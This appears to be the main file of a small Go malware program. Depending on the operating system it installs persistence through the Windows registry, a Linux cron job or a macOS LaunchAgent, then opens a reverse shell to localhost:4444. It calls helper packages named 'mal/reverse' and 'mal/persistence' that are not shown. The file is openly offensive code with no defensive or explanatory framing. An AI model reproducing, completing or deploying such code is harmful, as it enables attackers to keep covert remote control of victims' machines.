package main

import (
	"mal/reverse"
	"mal/persistence"
	"runtime"
)

func main() {

	if runtime.GOOS == "windows" {
		persistence.AddToRegistry()
	} else if runtime.GOOS == "linux" {
		persistence.AddToCron()
	} else if runtime.GOOS == "darwin" {
		persistence.AddToLaunchAgent()
	}

	reverse.StartReverseShell("localhost:4444")
}
